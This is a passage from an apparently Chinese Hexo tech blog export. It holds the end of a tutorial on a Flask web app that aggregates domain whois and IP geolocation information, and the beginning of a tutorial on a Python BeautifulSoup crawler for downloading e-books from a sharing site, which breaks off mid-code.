<span class="keyword">return</span> ipinfo</span><br></pre></td></tr></table></figure><h1 id="四、搭建一个FLASK-Web应用来查询聚合的域名、IP情报信息"><a href="#四、搭建一个FLASK-Web应用来查询聚合的域名、IP情报信息" class="headerlink" title="四、搭建一个FLASK Web应用来查询聚合的域名、IP情报信息"></a>四、搭建一个FLASK Web应用来查询聚合的域名、IP情报信息</h1><h2 id="1、FLASK-Web应用的工程组织"><a href="#1、FLASK-Web应用的工程组织" class="headerlink" title="1、FLASK Web应用的工程组织"></a>1、FLASK Web应用的工程组织</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211121/infocollect%E5%B7%A5%E7%A8%8B%E7%BB%84%E7%BB%87.png" alt="工程组织"></p><h2 id="2、配置数据及读取配置数据"><a href="#2、配置数据及读取配置数据" class="headerlink" title="2、配置数据及读取配置数据"></a>2、配置数据及读取配置数据</h2><h3 id="1）配置数据"><a href="#1）配置数据" class="headerlink" title="1）配置数据"></a>1）配置数据</h3><p>配置数据分别放在.env及.flaskenv中，其中<code>.env</code>放的是工程中用到的数据库链接等比较私密的配置信息。<code>.flaskenv</code>放的是Flask运行环境的信息<br>.env的配置信息参考如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DEV_DATABASE_URI = <span class="string">'mysql+pymysql://dbuser:yourpassword@127.0.0.1:3306/infocol_db_dev?charset=utf8'</span></span><br><span class="line">TEST_DATABASE_URI = <span class="string">'mysql+pymysql://dbuser:yourpassword@127.0.0.1:3306/infocol_db_test?charset=utf8'</span></span><br><span class="line">PROD_DATABASE_URI = <span class="string">'mysql+pymysql://dbuser:yourpassword@127.0.0.1:3306/infocol_db?charset=utf8'</span></span><br><span class="line"></span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = <span class="literal">True</span></span><br><span class="line">SECRET_KEY=your secret key</span><br></pre></td></tr></table></figure><p>.falskenv配置信息参考如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLASK_ENV=development</span><br></pre></td></tr></table></figure><h3 id="2）实现读取配置数据"><a href="#2）实现读取配置数据" class="headerlink" title="2）实现读取配置数据"></a>2）实现读取配置数据</h3><p>通过config.py实现配置数据的读取及管理</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> dotenv <span class="keyword">import</span> load_dotenv</span><br><span class="line">basedir=os.path.abspath(os.path.dirname(__file__))</span><br><span class="line">flaskenv_path=os.path.join(basedir,<span class="string">'.flaskenv'</span>)</span><br><span class="line">env_path=os.path.join(basedir,<span class="string">'.env'</span>)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(flaskenv_path):</span><br><span class="line">    load_dotenv(flaskenv_path)</span><br><span class="line"><span class="keyword">if</span> os.path.exists(env_path):</span><br><span class="line">    load_dotenv(env_path)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Config</span>:</span></span><br><span class="line">    geoLiteDBdir=os.path.join(basedir,<span class="string">'GeoLite2\GeoLite2-City.mmdb'</span>)</span><br><span class="line">    flaskenv = os.getenv(<span class="string">'FLASK_ENV'</span>,<span class="string">'development'</span>)</span><br><span class="line">    SECRET_KEY=os.getenv(<span class="string">'SECRET_KEY'</span>,<span class="string">'123!@#'</span>)</span><br><span class="line">    SQLALCHEMY_TRACK_MODIFICATIONS=os.getenv(<span class="string">'SQLALCHEMY_TRACK_MODIFICATIONS'</span>)</span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.getenv(<span class="string">'DEV_DATABASE_URI'</span>)</span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">init_app</span><span class="params">(app)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DevelopmentConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    DEBUG=<span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.getenv(<span class="string">'DEV_DATABASE_URI'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestingConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    TESTING=<span class="literal">True</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.getenv(<span class="string">'TEST_DATABASE_URI'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProductionConfig</span><span class="params">(Config)</span>:</span></span><br><span class="line">    SQLALCHEMY_DATABASE_URI = os.getenv(<span class="string">'PROD_DATABASE_URI'</span>)</span><br><span class="line"></span><br><span class="line">config=&#123;</span><br><span class="line">    <span class="string">'development'</span>:DevelopmentConfig,</span><br><span class="line">    <span class="string">'testing'</span>:TestingConfig,</span><br><span class="line">    <span class="string">'production'</span>:ProductionConfig,</span><br><span class="line">    <span class="string">'default'</span>:DevelopmentConfig</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3、界面及路由"><a href="#3、界面及路由" class="headerlink" title="3、界面及路由"></a>3、界面及路由</h2><p>界面很简单就一个域名/IP的输入框，输入域名或IP后去查询相应的域名信息或IP信息显示到界面上。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211121/index%E7%95%8C%E9%9D%A2.png" alt="index界面"></p><p>界面用jinjia2的模板<br>index.html代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends "bootstrap/base.html" %&#125;</span><br><span class="line">&#123;% block title %&#125;InfoCol&#123;% endblock %&#125;</span><br><span class="line">&#123;% block head %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line">&#123;% block body %&#125;</span><br><span class="line">    &#123;% block navbar %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar navbar-inverse"</span> <span class="attr">role</span>=<span class="string">"navigation"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-header"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">class</span>=<span class="string">"navbar-toggle"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">data-target</span>=<span class="string">".navbar-collapse"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"sr-only"</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">"icon-bar"</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">"navbar-brand"</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>InfoCol<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"navbar-collapse collapse"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">"nav navbar-nav"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>Home<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">    &#123;% block content %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"container"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"page-header "</span> &gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">class</span>=<span class="string">"center-block"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"center-block"</span> <span class="attr">style</span>=<span class="string">"text-align:center"</span>&gt;</span></span><br><span class="line">                &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">                &#123;&#123; form.name.label &#125;&#125;&#123;&#123; form.name() &#125;&#125;</span><br><span class="line">                &#123;&#123; form.submit() &#125;&#125;</span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">                &#123;% if whois_info %&#125;</span><br><span class="line">                  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-bordered"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span> <span class="attr">colspan</span>=<span class="string">"2"</span>&gt;</span>&#123;&#123; name &#125;&#125;的Whois信息<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    &#123;% for item in whois_info %&#125;</span><br><span class="line">                        &#123;% if item!='详情' %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"width: 20%"</span>&gt;</span>&#123;&#123; item &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"width: 80%"</span>&gt;</span>&#123;&#123; whois_info[item] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                        &#123;% else %&#125;</span><br><span class="line">                        <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"width: 20%"</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">a</span> <span class="attr">role</span>=<span class="string">"button"</span> <span class="attr">data-toggle</span>=<span class="string">"collapse"</span> <span class="attr">href</span>=<span class="string">"#collapseExample"</span> <span class="attr">aria-expanded</span>=<span class="string">"false"</span> <span class="attr">aria-controls</span>=<span class="string">"collapseExample"</span>&gt;</span></span><br><span class="line">                               &#123;&#123; item &#125;&#125;</span><br><span class="line">                            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">td</span> <span class="attr">style</span>=<span class="string">"width: 80%"</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"collapse"</span> <span class="attr">id</span>=<span class="string">"collapseExample"</span>&gt;</span></span><br><span class="line">                                  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"well"</span>&gt;</span></span><br><span class="line">                                    &#123;&#123; whois_info[item] &#125;&#125;</span><br><span class="line">                                  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                        &#123;% endif %&#125;</span><br><span class="line">                    &#123;% endfor %&#125;</span><br><span class="line">                  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">                &#123;% if ipinfos|length&gt;0 %&#125;</span><br><span class="line">                  <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">"table table-bordered"</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>IP<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>国家/地区<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>省份<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>城市<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>机构<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>ISP<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>经纬度<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>来源<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                      &#123;% for ipinfo in ipinfos %&#125;</span><br><span class="line">                      <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['ip'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['country'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['region'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['city'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['org'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['isp'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; ipinfo['loc'] &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                              &#123;% if ipinfo['source']=='ipinfo.io' %&#125;</span><br><span class="line">                                  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ipinfo.io/&#123;&#123; ipinfo['ip'] &#125;&#125;"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>&#123;&#123; ipinfo['source'] &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                              &#123;% elif ipinfo['source']=='ip-api.com'%&#125;</span><br><span class="line">                                  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://ip-api.com/json/&#123;&#123; ipinfo['ip'] &#125;&#125;"</span> <span class="attr">target</span>=<span class="string">"_blank"</span>&gt;</span>&#123;&#123; ipinfo['source'] &#125;&#125;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                              &#123;% else %&#125;</span><br><span class="line">                                  &#123;&#123; ipinfo['source'] &#125;&#125;</span><br><span class="line">                              &#123;% endif %&#125;</span><br><span class="line">                          <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                      &#123;% endfor %&#125;</span><br><span class="line">                  <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">                &#123;% endif %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure><p>路由配置处理中实现了获取表单中的信息，并判断是域名还是IP如果是域名者获取whois信息，并根据域名获取IP信息。如果输入的是IP则获取IP信息，并反馈到页面上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@index_bp.route('/',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    name = <span class="string">''</span></span><br><span class="line">    ipinfos = []</span><br><span class="line">    whois_info = <span class="string">''</span></span><br><span class="line">    form = InputForm()</span><br><span class="line">    <span class="keyword">if</span> form.validate_on_submit():</span><br><span class="line">        name = form.name.data</span><br><span class="line">        <span class="keyword">if</span> checkip(name):</span><br><span class="line">            ipinfos = getipinfo(name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            whois_info = getwhoisinfo(name)</span><br><span class="line">            whois_ip = getIPbyDomain(name)</span><br><span class="line">            <span class="keyword">if</span> checkip(whois_ip):</span><br><span class="line">                ipinfos = getipinfo(whois_ip)</span><br><span class="line">        form.name.data = <span class="string">''</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">'index.html'</span>,form=form, name=name, ipinfos=ipinfos, whois_info=whois_info)</span><br></pre></td></tr></table></figure><h2 id="4、最终实现效果"><a href="#4、最终实现效果" class="headerlink" title="4、最终实现效果"></a>4、最终实现效果</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211121/%E7%95%8C%E9%9D%A2%E6%9F%A5%E8%AF%A2%E6%95%88%E6%9E%9C.png" alt="界面查询效果"></p><p><strong>至此通过Python快速实现了一个简单的域名、IP信息聚合网站</strong></p><hr><p>全部源代码：<a href="https://github.com/xiejava1018/infocollect" target="_blank" rel="noopener">https://github.com/xiejava1018/infocollect</a></p><p>演示地址：<a href="http://test.ishareread.com/" target="_blank" rel="noopener">http://test.ishareread.com/</a></p><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python爬虫获取电子书资源实战</title>
      <link href="/posts/eab21fe5/"/>
      <url>/posts/eab21fe5/</url>
      
        <content type="html"><![CDATA[<p>最近在学习Python，相对java来说python简单易学、语法简单，工具丰富，开箱即用，适用面广做全栈开发那是极好的，对于小型应用的开发，虽然运行效率慢点，但开发效率极高。大大提高了咱们的生产力。为什么python能够在这几年火起来，自然有他的道理，当然也受益于这几年大数据和AI的火。</p><p>据说网络上80%的爬虫都是用python写的，不得不说python写爬虫真的是so easy。基本上一个不太复杂的网站可以通过python用100多行代码就能实现你所需要的爬取。<br>现在就以一个电子书的网站为例来实现python爬虫获取电子书资源。爬取整站的电子书资源，按目录保存到本地，并形成索引文件方便查找。</p><p>爬取的目标网站：苦瓜书盘</p><p>步骤：<strong>爬取-&gt;分析、解析-&gt;保存</strong></p><p>对于一个不需要登录验证的资源分享类的网站，爬取最大的工作量应该是在对目标页面的分析、解析、识别，这里用的到是Python的BeautifulSoup库。</p><p>一、获取目录</p><p>二、获取书籍列表页</p><p>三、获取书籍详情页</p><p>四、分析书籍详情页的资源地址</p><p>五、下载并保存</p><h1 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h1><p>引入相应的包，设置 headerd, 和资源保存路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> Book <span class="keyword">import</span> Book</span><br><span class="line"></span><br><span class="line">savepath=<span class="string">"J://kgbook//books//"</span> <span class="comment">#保存地址</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36'</span></span><br><span class="line">&#125;</span><br><span class="line">main_url=<span class="string">'https://kgbook.com/'</span></span><br><span class="line">bookcount=<span class="number">0</span></span><br></pre></td></tr></table></figure><h1 id="一、获取目录"><a href="#一、获取目录" class="headerlink" title="一、获取目录"></a>一、获取目录</h1><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E8%8E%B7%E5%8F%96%E7%9B%AE%E5%BD%95.png" alt="获取目录"><br>通过浏览器的调试工具可以看到目录在id=catagory的div标签下，下面还有ul和li标签，那我们可以迭代li可以获得目录及目录页的地址。<br>可以通过soup.find_all(attrs={‘id’: ‘category’})[0].ul 获取 到ul标签，然后获取ul的li标签，进行迭代获取。<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">获取目录</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getcategory</span><span class="params">()</span>:</span></span><br><span class="line">    req_result=requests.get(main_url,headers=headers)</span><br><span class="line">    <span class="keyword">if</span> req_result.status_code==<span class="number">200</span>:</span><br><span class="line">        htmlstr=req_result.content.decode(<span class="string">'utf-8'</span>)</span><br><span class="line">        soup = BeautifulSoup(htmlstr, <span class="string">'lxml'</span>)</span><br><span class="line">        categorys=soup.find_all(attrs=&#123;<span class="string">'id'</span>: <span class="string">'category'</span>&#125;)[<span class="number">0</span>].ul</span><br><span class="line">        <span class="keyword">for</span> li <span class="keyword">in</span> categorys.find_all(name=<span class="string">'li'</span>):</span><br><span class="line">            print(<span class="string">'开始抓取'</span>+li.a.attrs[<span class="string">'href'</span>]+<span class="string">"--"</span>+li.string)</span><br><span class="line">            getcategroydetail(main_url+li.a.attrs[<span class="string">'href'</span>],li.string)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h1 id="二、获取书籍列表页"><a href="#二、获取书籍列表页" class="headerlink" title="二、获取书籍列表页"></a>二、获取书籍列表页</h1><p>在书籍列表页，我们要获取两个信息，分别是书籍列表的信息及翻页下一页书籍列表的URL地址。<br>通过浏览器的调试工具分别对列表的信息及翻页下一页的html进行分析。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E8%8E%B7%E5%8F%96%E4%B9%A6%E7%B1%8D%E5%88%97%E8%A1%A8.png" alt="获取书籍列表页"><br>列表中的书籍详情页信息在class=”channel-item”的div标签下，通过class=”list-title”的h3标签循环迭代<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2021/20211120/%E7%BF%BB%E9%A1%B5.png" alt="翻页"><br>下一页，我们可以直接通过next_pag=soup.find(name=’a’,text=re.compile(‘下一页’))来获取。<br>然后我们可以通过递归来不断的调用获取下一页书籍列表页的代码，知道没有下一页为止。就可以把怎个目录都可以爬取完。<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td 